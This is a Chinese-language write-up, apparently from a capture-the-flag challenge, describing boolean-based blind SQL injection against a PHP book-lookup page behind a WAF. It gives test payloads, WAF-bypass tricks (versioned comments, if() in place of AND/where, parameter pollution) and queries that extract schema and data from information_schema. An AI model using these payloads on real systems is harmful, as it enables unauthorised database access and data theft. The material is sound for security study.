## 二、确认布尔盲注

```text
?id=0' OR '1'='1   -> HIT
?id=0' OR '1'='2   -> MISS
```

说明：

- 闭合符是单引号 `'`；
- 基值必须用不存在的 `0`，不能用 `1`；
- 不需要注释，末尾用：

  ```text
  OR '1'='2
  ```

  吸收程序自己的收尾引号。

`?id=1' OR '1'='2` 也 HIT，因为 `1` 本身是存在的书，不能当基值。

## 三、WAF 拦截与绕过

| 被拦 | 现象 | 绕过 |
|---|---|---|
| `select` | 裸 `select 1` MISS | `/*!50000select*/` |
| `from` | 裸 `from` MISS | `/*!50000from*/` |
| `AND` | `id=6 AND 1=1` MISS | `if(id=6, ..., 0)` |
| `where` | 所有带 `where` 的查询空 | 在 `select` 里用 `if` 过滤 |
| `-- -` 注释 | 一真一假都变假 | 用 `OR '1'='2` 收尾 |

HPP：

```text
?id=6&id=0' OR (...) OR '1'='2
```

- 第一个 `id=6` 给 WAF；
- 第二个 `id` 给 PHP；
- PHP 取最后一个。

## 五、不用 where 的查询

### 表名

```sql
select group_concat(if(table_schema='syclover',table_name,NULL))
from information_schema.tables
```

### 列名

```sql
select group_concat(
  if(concat(table_schema,0x2e,table_name)='syclover.books',column_name,NULL)
)
from information_schema.columns
```

### 数据

```sql
select group_concat(if(id=6,title,NULL))
from syclover.books
```

`if` 不匹配时返回 `NULL`，`group_concat` 会自动忽略。

## 七、踩坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `where` 被拦 | 表/列/数据全空 | `if` 过滤，不写 `where` |
| `AND` 被拦 | `id=6 AND 1=1` MISS | `if(id=6, ..., 0)` |
| 裸 URL | 库名为空 | `quote` 编码空格/引号 |
| 固定范围太小 | 列名截断 | 20 → 40 |
| 固定范围太大 | 猜完还继续 | 先 `length()`，或接受多跑 |
| `-- -` | 真假都变假 | 不用注释 |
| `syclover` / `syalover` | 表查不到 | 单独输入 schema |
| `information_schema` 全表 | 系统表占满 `group_concat` | 按 schema 过滤 |
